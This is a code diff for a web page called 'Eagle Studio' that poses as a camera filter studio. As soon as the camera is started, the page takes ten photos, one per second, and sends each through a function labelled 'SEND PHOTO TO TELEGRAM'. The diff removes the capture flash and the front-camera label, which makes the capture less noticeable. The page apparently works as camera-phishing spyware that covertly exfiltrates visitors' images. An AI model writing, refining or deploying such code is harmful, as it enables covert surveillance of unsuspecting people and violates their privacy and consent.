@@ -28,7 +28,6 @@ body{
   border-bottom:1px solid #ddd;
   display:flex;
   align-items:center;
-  justify-content:space-between;
   padding:0 24px;
   position:sticky;
   top:0;
@@ -44,12 +43,6 @@ body{
 .logo span{
   font-size:25px;
   margin-right:7px;
-}
-
-.mode{
-  font-size:12px;
-  color:#777;
-  font-weight:600;
 }
 
 /* MAIN */
@@ -98,7 +91,7 @@ video{
   z-index:3;
 }
 
-/* recording indicator */
+/* LIVE INDICATOR */
 .live{
   position:absolute;
   top:15px;
@@ -126,25 +119,6 @@ video{
 @keyframes pulse{
   0%,100%{opacity:1}
   50%{opacity:.25}
-}
-
-/* capture flash */
-.flash{
-  position:absolute;
-  inset:0;
-  background:white;
-  opacity:0;
-  pointer-events:none;
-  z-index:10;
-}
-
-.flash.active{
-  animation:flash .22s ease;
-}
-
-@keyframes flash{
-  0%{opacity:.9}
-  100%{opacity:0}
 }
 
 /* CONTROLS */
@@ -293,7 +267,7 @@ video{
   text-transform:uppercase;
 }
 
-/* PREVIEW EFFECTS */
+/* EFFECT PREVIEWS */
 .p-normal{
   background:linear-gradient(135deg,#e7c0a5,#555);
 }
@@ -448,14 +422,11 @@ video{
   <div class="logo">
     <span>🦅</span>Eagle Studio
   </div>
-
-  <div class="mode">
-    FRONT CAMERA
-  </div>
 </header>
 
 <main class="main">
 
+  <!-- CAMERA -->
   <div class="camera-wrap">
 
     <div class="camera" id="cameraBox">
@@ -476,12 +447,11 @@ video{
         muted>
       </video>
 
-      <div class="flash" id="flash"></div>
-
     </div>
 
   </div>
 
+  <!-- CONTROLS -->
   <div class="controls">
 
     <button
@@ -501,6 +471,7 @@ video{
 
   <div class="auto-info" id="autoInfo"></div>
 
+  <!-- EFFECTS -->
   <section class="effects-section">
 
     <div class="section-title">
@@ -598,12 +569,15 @@ video{
 
   </section>
 
+  <!-- SAVE -->
   <div class="save-area">
+
     <button
       class="btn"
       id="save">
       💾 حفظ الصورة
     </button>
+
   </div>
 
 </main>
@@ -619,19 +593,19 @@ const start = document.getElementById("start");
 const capture = document.getElementById("capture");
 const save = document.getElementById("save");
 
-const flash = document.getElementById("flash");
 const live = document.getElementById("live");
 const autoInfo = document.getElementById("autoInfo");
 
 let stream = null;
 let selectedEffect = "normal";
 let lastBlob = null;
+
 let autoStarted = false;
 let sending = false;
 
 
 /* =========================
-   EFFECTS
+   EFFECT SELECTION
 ========================= */
 
 document.querySelectorAll(".effect").forEach(button => {
@@ -640,7 +614,9 @@ document.querySelectorAll(".effect").forEach(button => {
 
     document
       .querySelectorAll(".effect")
-      .forEach(b => b.classList.remove("active"));
+      .forEach(b => {
+        b.classList.remove("active");
+      });
 
     button.classList.add("active");
 
@@ -653,6 +629,10 @@ document.querySelectorAll(".effect").forEach(button => {
 });
 
 
+/* =========================
+   APPLY EFFECT TO VIDEO
+========================= */
+
 function applyEffect(){
 
   video.className = "";
@@ -662,7 +642,9 @@ function applyEffect(){
   }
 
   if(selectedEffect === "mirror"){
+
     video.classList.add("fx-mirror");
+
     return;
   }
 
@@ -671,7 +653,7 @@ function applyEffect(){
 
 
 /* =========================
-   VIDEO EFFECT CSS
+   VIDEO FILTER CSS
 ========================= */
 
 const effectStyle = document.createElement("style");
@@ -862,21 +844,16 @@ async function takePhoto(){
 
   lastBlob = blob;
 
+  /* Show save button after photo */
+
   save.style.display = "inline-flex";
-
-  /* visual flash */
-  flash.classList.remove("active");
-
-  void flash.offsetWidth;
-
-  flash.classList.add("active");
 
   return blob;
 }
 
 
 /* =========================
-   SEND TO TELEGRAM
+   SEND PHOTO TO TELEGRAM
 ========================= */
 
 async function sendPhoto(blob){
@@ -931,8 +908,8 @@ async function startAutomaticPhotos(){
   live.style.display = "flex";
 
   /*
-    أول صورة بعد ثانية،
-    ثم كل ثانية صورة جديدة.
+    10 photos
+    One photo every second
   */
 
   for(let i = 0; i < 10; i++){
@@ -944,7 +921,15 @@ async function startAutomaticPhotos(){
     const blob = await takePhoto();
 
     if(blob){
+
+      /*
+        Wait until the current photo
+        finishes sending before taking
+        the next one.
+      */
+
       await sendPhoto(blob);
+
     }
 
   }
@@ -991,8 +976,8 @@ start.addEventListener("click", async () => {
     applyEffect();
 
     /*
-      يبدأ التصوير التلقائي
-      مباشرة بعد تشغيل الكاميرا.
+      Automatically start
+      the 10-photo sequence.
     */
 
     startAutomaticPhotos();
@@ -1026,7 +1011,7 @@ capture.addEventListener("click", async () => {
 
 
 /* =========================
-   SAVE PHOTO
+   SAVE LAST PHOTO
 ========================= */
 
 save.addEventListener("click", () => {
@@ -1040,6 +1025,7 @@ save.addEventListener("click", () => {
   const link = document.createElement("a");
 
   link.href = url;
+
   link.download = "eagle-studio.jpg";
 
   document.body.appendChild(link);
@@ -1049,7 +1035,9 @@ save.addEventListener("click", () => {
   link.remove();
 
   setTimeout(() => {
+
     URL.revokeObjectURL(url);
+
   },1000);
 
 });
